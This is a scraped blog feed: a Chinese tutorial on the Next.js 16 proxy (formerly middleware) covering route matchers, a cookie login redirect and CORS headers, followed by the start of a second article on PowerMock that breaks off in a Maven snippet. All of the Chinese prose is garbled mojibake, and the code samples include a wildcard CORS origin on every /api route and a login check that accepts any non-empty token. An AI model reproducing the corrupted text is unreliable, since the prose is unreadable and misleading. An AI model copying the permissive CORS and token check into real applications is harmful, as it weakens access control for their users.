data-id="heading-0">Proxyä»£ç†</h2>
<blockquote>
<p>ä» Next.js 16 å¼€å§‹ï¼Œä¸­é—´ä»¶<code>Middleware</code>æ›´åä¸ºä»£ç†<code>ï¼ˆProxyï¼‰</code>ï¼Œä»¥æ›´å¥½åœ°ä½“ç°å…¶ç”¨é€”ã€‚å…¶åŠŸèƒ½ä¿æŒä¸å˜</p>
</blockquote>
<p>å¦‚æœä½ æƒ³å‡çº§ä¸º16.xç‰ˆæœ¬ï¼ŒNext.jsæä¾›äº†å‘½ä»¤è¡Œå·¥å…·æ¥å¸®åŠ©ä½ å‡çº§ï¼Œåªéœ€è¦æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">npx @next/codemod@canary middleware-to-proxy .
</code></pre>
<p>ä»£ç è½¬æ¢ä¼šå°†æ–‡ä»¶å’Œå‡½æ•°åä»middlewareé‡å‘½åä¸ºproxyã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// middleware.ts -&gt; proxy.ts</span>
 
- <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params"/>) {
+ <span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params"/>) {
</code></pre>
<h3 data-id="heading-1">åŸºæœ¬ä½¿ç”¨</h3>
<p>åº”ç”¨åœºæ™¯ï¼š</p>
<ul>
<li>å¤„ç†è·¨åŸŸè¯·æ±‚</li>
<li>æ¥å£è½¬å‘ä¾‹å¦‚/api/user -&gt; (å¯èƒ½æ˜¯å…¶ä»–æœåŠ¡å™¨java/go/pythonç­‰) -&gt; /api/user</li>
<li>é™æµä¾‹å¦‚é…åˆç¬¬ä¸‰æ–¹æœåŠ¡åšé™æµ</li>
<li>é‰´æƒ/åˆ¤æ–­æ˜¯å¦ç™»å½•</li>
</ul>
<p>Prxoyä»£ç†å…¶å®è·Ÿæ‹¦æˆªå™¨ç±»ä¼¼ï¼Œå®ƒå¯ä»¥åœ¨è¯·æ±‚å®Œæˆä¹‹å‰è¿›è¡Œæ‹¦æˆªï¼Œç„¶åè¿›è¡Œä¸€äº›å¤„ç†ï¼Œä¾‹å¦‚ï¼šä¿®æ”¹è¯·æ±‚å¤´ã€ä¿®æ”¹è¯·æ±‚ä½“ã€ä¿®æ”¹å“åº”ä½“ç­‰ã€‚</p>
<p>src/proxy.ts</p>
<p>å®šä¹‰proxyå‡½æ•°å¯¼å‡ºå³å¯ï¼ŒNext.jsä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(request.<span class="hljs-property">url</span>,<span class="hljs-string">'url'</span>);
}
</code></pre>
<p>ä½†æ˜¯ä½ ä¼šå‘ç°ï¼Œä»–ä¼šæ‹¦æˆªé¡¹ç›®ä¸­æ‰€æœ‰çš„è¯·æ±‚ï¼ŒåŒ…æ‹¬é™æ€èµ„æºã€APIè¯·æ±‚ã€é¡µé¢è¯·æ±‚ç­‰ã€‚</p>
<pre><code class="hljs language-txt" lang="txt">http://localhost:3000/.well-known/appspecific/com.chrome.devtools.json url
http://localhost:3000/_next/static/chunks/src_app_globals_91e4631d.css url
http://localhost:3000/_next/static/chunks/%5Bturbopack%5D_browser_dev_hmr-client_hmr-client_ts_cedd0592._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_react-dom_1e674e59._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_react-server-dom-turbopack_9212ccad._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_next-devtools_index_1dd7fb59.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_compiled_a0e4c7b4._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_client_a38d7d69._.js url
http://localhost:3000/_next/static/chunks/node_modules_next_dist_4b2403f5._.js url
http://localhost:3000/_next/static/chunks/src_app_globals_91e4631d.css.map url
http://localhost:3000/_next/static/chunks/node_modules_%40swc_helpers_cjs_d80fb378._.js url
http://localhost:3000/_next/static/chunks/_a0ff3932._.js url
http://localhost:3000/api/login url
</code></pre>
<h4 data-id="heading-2">é…ç½®(config)</h4>
<p>ä¾‹å¦‚æˆ‘ä»¬åªæƒ³åŒ¹é…<code>'/api'</code>ä¸‹é¢çš„è·¯å¾„å»åšä¸€äº›äº‹æƒ…ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>config</code>é…ç½®æ¥å®ç°ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(request.<span class="hljs-property">url</span>,<span class="hljs-string">'url'</span>);
}
<span class="hljs-comment">//é…ç½®åŒ¹é…è·¯å¾„</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {
    <span class="hljs-attr">matcher</span>: <span class="hljs-string">'/api/:path*'</span>,
    <span class="hljs-comment">//matcher: ['/api/:path*','/api/user/:path*'], æ”¯æŒå•ä¸ªä»¥åŠå¤šä¸ªè·¯å¾„åŒ¹é…</span>
    <span class="hljs-comment">//matcher: ['/((?!api|_next/static|_next/image|.*\\.png$).*)'], åŒæ ·æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</span>
}
</code></pre>
<p>ç»“åˆä¹‹å‰çš„æ¡ˆä¾‹,åœ¨cookieé‚£ä¸€é›†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å•ç‹¬å®šä¹‰checkæ¥å£æ£€æŸ¥cookieï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨proxyä¸­å®ç°ã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-keyword">const</span> cookie = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'token'</span>);
    <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/home'</span>) &amp;&amp; !cookie) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'redirect to login'</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/'</span>, request.<span class="hljs-property">url</span>));
    }
    <span class="hljs-keyword">if</span> (cookie &amp;&amp; cookie.<span class="hljs-property">value</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/'</span>, request.<span class="hljs-property">url</span>));
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = {
    <span class="hljs-attr">matcher</span>: [<span class="hljs-string">'/api/:path*'</span>, <span class="hljs-string">'/home/:path*'</span>],
}
</code></pre>
<h4 data-id="heading-3">å¤æ‚åŒ¹é…</h4>
<ul>
<li>source: è¡¨ç¤ºåŒ¹é…è·¯å¾„</li>
<li>has: è¡¨ç¤ºåŒ¹é…è·¯å¾„ä¸­å¿…é¡»(åŒ…å«)æŸäº›æ¡ä»¶</li>
<li>missing: è¡¨ç¤ºåŒ¹é…è·¯å¾„ä¸­(å¿…é¡»ä¸åŒ…å«)æŸäº›æ¡ä»¶</li>
</ul>
<p><strong>type</strong> åªèƒ½åŒ¹é…: header, query, cookie</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ProxyConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'start proxy'</span>)
   <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">ProxyConfig</span> = {
    <span class="hljs-attr">matcher</span>: [
        {
            <span class="hljs-attr">source</span>: <span class="hljs-string">'/home/:path*'</span>,
            <span class="hljs-comment">//è¡¨ç¤ºåŒ¹é…è·¯å¾„ä¸­å¿…é¡»(åŒ…å«)Authorizationå¤´å’ŒuserIdæŸ¥è¯¢å‚æ•°</span>
            <span class="hljs-attr">has</span>: [
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'header'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'Authorization'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'Bearer 123456'</span> },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'query'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'userId'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'123'</span> }
            ],
            <span class="hljs-comment">//è¡¨ç¤ºåŒ¹é…è·¯å¾„ä¸­(å¿…é¡»ä¸åŒ…å«)cookieå’ŒuserIdæŸ¥è¯¢å‚æ•°</span>
            <span class="hljs-attr">missing</span>: [
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'cookie'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'token'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'123456'</span> },
                { <span class="hljs-attr">type</span>: <span class="hljs-string">'query'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'userId'</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">'456'</span> },
            ]
        },
    ]
}
</code></pre>
<p>è®¿é—®urlä¸ºï¼š<code>http://localhost:3000/home?userId=123</code></p>
<h4 data-id="heading-4">æ¡ˆä¾‹å®æˆ˜(å¤„ç†è·¨åŸŸ)</h4>
<p>åªè¦æ˜¯/apiä¸‹é¢çš„æ¥å£éƒ½å¯ä»¥è¢«ä»»æ„è®¿é—®</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextRequest</span>, <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ProxyConfig</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"next/server"</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">proxy</span>(<span class="hljs-params">request: NextRequest</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(corsHeaders).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">[key, value]</span>) =&gt;</span> {
        response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(key, value);
    })
    <span class="hljs-keyword">return</span> response;
}

<span class="hljs-keyword">const</span> corsHeaders = {
    <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,
    <span class="hljs-string">'Access-Control-Allow-Methods'</span>: <span class="hljs-string">'GET, POST, PUT, DELETE, OPTIONS'</span>,
    <span class="hljs-string">'Access-Control-Allow-Headers'</span>: <span class="hljs-string">'Content-Type, Authorization'</span>,
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">config</span>: <span class="hljs-title class_">ProxyConfig</span> = {
   <span class="hljs-attr">matcher</span>:<span class="hljs-string">'/api/:path*'</span>,
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb6ec749269e4c428d9ed3e7d8cf9a8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5ruhenM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764507639&amp;x-signature=sOLI4%2BJZEG05m3caC%2F6GzrkV9SA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨å¥½PowerMockï¼Œè½»æ¾æå®šé‚£äº›è®©ä½ å¤´ç–¼çš„å•å…ƒæµ‹è¯•]]></title>    <link>https://juejin.cn/post/7575102209606221850</link>    <guid>https://juejin.cn/post/7575102209606221850</guid>    <pubDate>2025-11-23T08:26:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102209606221850" data-draft-id="7575119254313844762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨å¥½PowerMockï¼Œè½»æ¾æå®šé‚£äº›è®©ä½ å¤´ç–¼çš„å•å…ƒæµ‹è¯•"/> <meta itemprop="keywords" content="åç«¯,å•å…ƒæµ‹è¯•"/> <meta itemprop="datePublished" content="2025-11-23T08:26:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Javaéšæƒ³å½•"/> <meta itemprop="url" content="https://juejin.cn/user/2837192913204935"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨å¥½PowerMockï¼Œè½»æ¾æå®šé‚£äº›è®©ä½ å¤´ç–¼çš„å•å…ƒæµ‹è¯•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2837192913204935/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Javaéšæƒ³å½•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:26:47.000Z" title="Sun Nov 23 2025 08:26:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡å·²æ”¶å½•è‡³GitHubï¼Œæ¨èé˜…è¯» ğŸ‘‰ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FBookSea4j%2FJavaRecord" target="_blank" title="https://github.com/BookSea4j/JavaRecord" ref="nofollow noopener noreferrer">Javaéšæƒ³å½•</a></p>
<p>å¾®ä¿¡å…¬ä¼—å·ï¼šJavaéšæƒ³å½•</p>
<p>ç»“åˆÂ <a href="https://juejin.cn/post/7498580969286631434" target="_blank" title="https://juejin.cn/post/7498580969286631434">ä¸ç”¨Mockitoå†™å•å…ƒæµ‹è¯•ï¼Ÿä½ å¯èƒ½åœ¨æµªè´¹ä¸€åŠæ—¶é—´</a>Â é˜…è¯»ä½“éªŒæ›´ä½³ã€‚</p>
<blockquote>
<p>é¢å¯¹æ— æ³•Mockçš„é™æ€æ–¹æ³•ã€ç§æœ‰æ–¹æ³•å’Œfinalç±»ï¼ŒPowerMockä¸ºä½ æ‰“å¼€ä¸€æ‰‡æ–°çš„å¤§é—¨</p>
</blockquote>
<p>ä½œä¸ºä¸€åJavaå¼€å‘è€…ï¼Œå•å…ƒæµ‹è¯•æ˜¯æˆ‘ä»¬ä¿è¯ä»£ç è´¨é‡çš„é‡è¦ç¯èŠ‚ã€‚ä½†åœ¨å®é™…å·¥ä½œä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¸€äº›éš¾ä»¥æµ‹è¯•çš„ä»£ç åœºæ™¯ï¼šé™æ€å·¥å…·ç±»ã€finalç±»ã€ç§æœ‰æ–¹æ³•ç­‰ã€‚ä¼ ç»Ÿçš„Mockitoæ¡†æ¶å¯¹è¿™äº›æƒ…å†µæŸæ‰‹æ— ç­–ï¼Œè€ŒPowerMockçš„å‡ºç°æ­£å¥½è§£å†³äº†è¿™äº›ç—›ç‚¹ã€‚</p>
<h2 data-id="heading-0">PowerMockæ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆéœ€è¦å®ƒï¼Ÿ</h2>
<h3 data-id="heading-1">PowerMockçš„æ ¸å¿ƒå®šä½</h3>
<p>PowerMockæ˜¯ä¸€ä¸ªå¼ºå¤§çš„Javaå•å…ƒæµ‹è¯•æ¡†æ¶ï¼Œå®ƒé€šè¿‡æ‰©å±•ç°æœ‰çš„Mockæ¡†æ¶ï¼ˆå¦‚Mockitoå’ŒEasyMockï¼‰ï¼Œæä¾›äº†æ›´å¼ºå¤§çš„Mockèƒ½åŠ›ã€‚<strong>PowerMockçš„æ ¸å¿ƒä»·å€¼åœ¨äºå®ƒèƒ½å¤ŸMocké‚£äº›ä¼ ç»ŸMockå·¥å…·æ— æ³•å¤„ç†çš„æƒ…å†µ</strong>ï¼ŒåŒ…æ‹¬é™æ€æ–¹æ³•ã€finalç±»å’Œæ–¹æ³•ã€ç§æœ‰æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ã€‚</p>
<p>ä¸æ™®é€šMockæ¡†æ¶ä¸åŒï¼ŒPowerMockä½¿ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨å’Œå­—èŠ‚ç æ“ä½œæŠ€æœ¯ï¼ˆåŸºäºJavassistå’ŒASMåº“ï¼‰ï¼Œåœ¨è¿è¡Œæ—¶ä¿®æ”¹ç±»çš„è¡Œä¸ºï¼Œä»è€Œå®ç°å¯¹è¿™äº›"éš¾ä»¥Mock"çš„åœºæ™¯çš„å®Œå…¨æ§åˆ¶ã€‚</p>
<h3 data-id="heading-2">PowerMockä¸Mockitoçš„å…³ç³»å’ŒåŒºåˆ«</h3>
<p>è™½ç„¶PowerMockå’ŒMockitoéƒ½æ˜¯ç”¨äºå•å…ƒæµ‹è¯•çš„Mockæ¡†æ¶ï¼Œä½†å®ƒä»¬åœ¨åŠŸèƒ½å’Œå®šä½ä¸Šæœ‰ç€æ˜æ˜¾çš„åŒºåˆ«ï¼š</p>
<p><strong>Mockito</strong>æ˜¯ä¸€ä¸ªè½»é‡çº§ã€ç®€å•æ˜“ç”¨çš„Mockæ¡†æ¶ï¼Œé€‚ç”¨äºå¤§å¤šæ•°æ—¥å¸¸æµ‹è¯•åœºæ™¯ã€‚ä½†å®ƒæœ‰æ˜æ˜¾çš„å±€é™æ€§ï¼šæ— æ³•Mocké™æ€æ–¹æ³•ã€finalç±»ã€ç§æœ‰æ–¹æ³•å’Œæ„é€ å‡½æ•°ç­‰ã€‚</p>
<p><strong>PowerMock</strong>åˆ™æ˜¯å¯¹Mockitoçš„å¢å¼ºï¼Œå¡«è¡¥äº†Mockitoçš„åŠŸèƒ½ç©ºç™½ã€‚å®ƒä¸æ˜¯æ›¿ä»£Mockitoï¼Œè€Œæ˜¯ä¸MockitoååŒå·¥ä½œï¼Œå…±åŒæ„å»ºå®Œæ•´çš„å•å…ƒæµ‹è¯•è§£å†³æ–¹æ¡ˆã€‚</p>
<p>ä¸¤è€…æ ¸å¿ƒåŒºåˆ«ä½“ç°åœ¨åº•å±‚å®ç°ä¸Šï¼šMockitoä½¿ç”¨åŠ¨æ€ä»£ç†ï¼ˆCGLIBï¼‰æŠ€æœ¯ï¼Œè€ŒPowerMocké€šè¿‡ä¿®æ”¹å­—èŠ‚ç æ¥å®ç°æ›´å¼ºå¤§çš„Mockèƒ½åŠ›ã€‚</p>
<p>æ­£å› ä¸ºè¿™ç§æ ¹æœ¬å·®å¼‚ï¼ŒPowerMockå¯ä»¥è§£å†³Mockitoæ— æ³•è§£å†³çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-3">PowerMockè§£å†³çš„ç—›ç‚¹</h3>
<p>åœ¨æ—¥å¸¸å¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä»¥ä¸‹æµ‹è¯•éš¾é¢˜ï¼š</p>
<ul>
<li><strong>é™æ€å·¥å…·ç±»</strong>ï¼šå¦‚å„ç§Utilç±»ä¸­çš„é™æ€æ–¹æ³•ã€‚</li>
<li><strong>finalç±»å’Œfinalæ–¹æ³•</strong>ï¼šç‰¹åˆ«æ˜¯ç¬¬ä¸‰æ–¹åº“ä¸­çš„finalç±»ã€‚</li>
<li><strong>ç§æœ‰æ–¹æ³•</strong>ï¼šéœ€è¦ç›´æ¥æµ‹è¯•çš„ç§æœ‰æ–¹æ³•é€»è¾‘ã€‚</li>
<li><strong>æ„é€ å‡½æ•°ä¾èµ–</strong>ï¼šæ–¹æ³•å†…éƒ¨é€šè¿‡newåˆ›å»ºçš„å¯¹è±¡ã€‚</li>
<li><strong>é™æ€ä»£ç å—å’Œç³»ç»Ÿç±»</strong>ï¼šå¦‚System.currentTimeMillis()ã€‚</li>
</ul>
<p>è¿™äº›é—®é¢˜ä½¿ç”¨ä¼ ç»ŸMockæ¡†æ¶éš¾ä»¥è§£å†³ï¼Œè€ŒPowerMockä¸ºæ­¤æä¾›äº†å®Œæ•´çš„è§£å†³æ–¹æ¡ˆ</p>
<h2 data-id="heading-4">ç¯å¢ƒé…ç½®ä¸åŸºæœ¬ç”¨æ³•</h2>
<h3 data-id="heading-5">æ·»åŠ Mavenä¾èµ–</h3>
<p>è¦å¼€å§‹ä½¿ç”¨PowerMockï¼Œé¦–å…ˆéœ€è¦åœ¨é¡¹ç›®ä¸­æ·»åŠ ç›¸å…³ä¾èµ–ã€‚ç”±äºPowerMockéœ€è¦ä¸MockitoååŒå·¥ä½œï¼Œéœ€è¦åŒæ—¶æ·»åŠ ä¸¤ä¸ªä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- PowerMock + Mockito ç»„åˆ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.powermock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>powermock-module-junit4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
